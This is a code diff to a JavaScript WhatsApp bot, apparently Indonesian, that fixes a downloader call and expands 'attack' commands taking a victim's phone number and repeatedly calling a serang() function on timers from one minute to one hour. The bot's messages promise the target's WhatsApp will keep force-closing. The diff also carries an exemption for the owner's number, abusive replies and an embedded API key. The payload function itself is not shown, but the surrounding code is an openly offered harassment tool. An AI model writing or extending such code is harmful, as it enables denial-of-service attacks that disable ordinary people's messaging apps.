@@ -2654,7 +2654,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
             break
 	        case 'tiktok': case 'tiktoknowm': {
 	if (!text) throw 'Masukkan Query Link!'
-	let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey')))
+	let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
 	 let buttons = [
                     {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                     {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
@@ -3975,7 +3975,7 @@ case 'carbon':{
 	}
 	break
 	case 'santed': case 'attack':{
-	    if (isCreator)
+	    if (!isCreator) throw mess.owner
 		if (!text) throw `Where The Target?`
 let nomore = q + "@s.whatsapp.net"
 if (isNaN(q)) throw `Must be a number `
@@ -3983,22 +3983,59 @@ var satgnz = "6281316701742"
 let isnoown = new RegExp(satgnz, 'i')
 let isOwn = isnoown.test(m.text)
  if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
+                let sccod = [
+                {
+                title: "Choose One!",
+                rows: [
+                {title: "1 MENIT", rowId: `.tack ${q}`, description: `Attack Wa Target Selama 1 Menit`},
+                {title: "10 MENIT", rowId: `.tackk ${q}`, description: `Attack Wa Target Selama 10 Menit`},
+                {title: "30 MENIT", rowId: `tackkk`, description: `Attack Wa Target Selama 30 Menit`},
+                {title: "1 JAM", rowId: `attck${q}`, description: `Attack Wa Target Selama 1 Jam`}
+                ]
+                },
+                ]
+                SatganzDevs.sendListMsg(m.chat, `Hi Bitch!, Please Choose Time To Attack`, `Tch`, `Click Here`, sccod, m)
+            }
+            break
+            case 'tack':{
+            	let nomore = q + "@s.whatsapp.net"
+            m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
+            await sleep(60000)
 serang(nomore)
-m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
 		}
 		break
-		case 'brutack': case 'bruted':{
-	    if (isCreator)
-		if (!text) throw `Where The Target?`
-let nomore = q + "@s.whatsapp.net"
-if (isNaN(q)) throw `Must be a number `
-var satgnz = "6281316701742"
-let isnoown = new RegExp(satgnz, 'i')
-let isOwn = isnoown.test(m.text)
- if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
+		case 'tackk':{
+		nomore = q + "@s.whatsapp.net"
+m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 10 menit`)
+await sleep(600000)
 serang(nomore)
-m.reply(`Sukses Brutal Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 10 menit`)
-await sleep(30000)
+		}
+		break
+		case 'tackkk':{
+		nomore = q + "@s.whatsapp.net"
+		m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 30 menit`)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+		}
+		break
+		case 'attck':{
+		nomore = q + "@s.whatsapp.net"
+		m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 jam`)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
+serang(nomore)
+await sleep(600000)
 serang(nomore)
 		}
 		break
